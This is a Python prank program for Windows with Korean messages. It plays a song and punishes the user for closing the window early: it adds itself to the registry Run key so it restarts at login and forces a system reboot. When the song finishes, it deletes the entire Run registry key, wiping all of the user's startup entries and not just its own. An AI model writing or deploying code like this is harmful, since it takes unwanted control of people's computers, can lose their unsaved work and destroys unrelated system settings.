import os
assert os.name == "nt", "윈도우에서만 작동합니다."

import time
import base64
import ctypes
import winreg
import inspect
import threading
import webbrowser

from contextlib import redirect_stdout

with redirect_stdout(None):
    from pygame import mixer

from tkinter import *
from tkinter import font
from tkinter import messagebox
from io import BytesIO

from sets import image_base64, audio_base64

root = Tk()

mixer.init()

try:
    ctypes.windll.shcore.SetProcessDpiAwareness(2)
except:
    try:
        ctypes.windll.user32.SetProcessDpiAware()
    except:
        pass

music_end = False

this = inspect.getfile(
    inspect.currentframe()
)
this_path = os.path.dirname(
    os.path.realpath(this)
)
this_name = os.path.basename(this)
this_adress = os.path.join(this_path, this_name)

key = winreg.HKEY_CURRENT_USER
key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

def play_music():
    def _play_music():
        global music_end, root
        mixer.music.load(
            BytesIO(base64.b64decode(audio_base64))
        )
        mixer.music.play()

        while mixer.music.get_busy():
            pass

        music_end = True
        root.destroy()

    threading.Thread(target=_play_music).start()

def change_title():
    def _change_title():
        global root

        a = 0

        while True:
            time.sleep(60)
            a += 1
            root.title(f"{a}분 지났어요...")
            root.update()
    threading.Thread(target=_change_title).start()

def on_exit():
    mixer.music.fadeout(3000)

    if not music_end:
        open_key = winreg.OpenKey(
            key,
            key_value,
            0,
            winreg.KEY_ALL_ACCESS
        )
        messagebox.showwarning("...", "왜 노래를 끝까지 듣지 않으셨나요?")
        messagebox.showwarning("...", "컴퓨터를 재부팅 할 겁니다.")
        messagebox.showwarning("...", "그리고 다시 돌아와서 한번 더 노래를 듣게 할 겁니다.")
        messagebox.showinfo(":(", "그럼 안녕")
        winreg.SetValueEx(open_key, "ListenThisMusic", 0, winreg.REG_SZ, this_adress)
        winreg.CloseKey(open_key)
        os.system("shutdown /r")
        os._exit(1)
    else:
        messagebox.showinfo(":)", "노래를 끝까지 들으셨군요!")
        messagebox.showinfo(":)", "노래의 저작권은 Snail's House (ujico)님에게 있습니다!")

        winreg.DeleteKeyEx(
            key,
            key_value,
            winreg.KEY_ALL_ACCESS,
            0
        )

        os._exit(0)

open_spotify = lambda: webbrowser.open("https://open.spotify.com/track/4mCwspCTPF1aoWUNxsS5aD?si=c5d987f3f38a42bf")

root.geometry("500x200")
root.resizable(False, False)
root.title("...")

listen_on_spotify = PhotoImage(master=root, data=image_base64)

text = Label(root, text="이 노래를 끝까지 들어야 이 프로그램은 종료됩니다.", font=font.Font(root, size=16))
song = Label(root, text="음악: Snail's House - Hot Milk", font=font.Font(root, size=12))
spotify = Button(root, image=listen_on_spotify, bd=0, command=open_spotify)

play_music()
change_title()

text.pack()
song.pack()
spotify.pack()
root.protocol("WM_DELETE_WINDOW", on_exit)
root.mainloop()
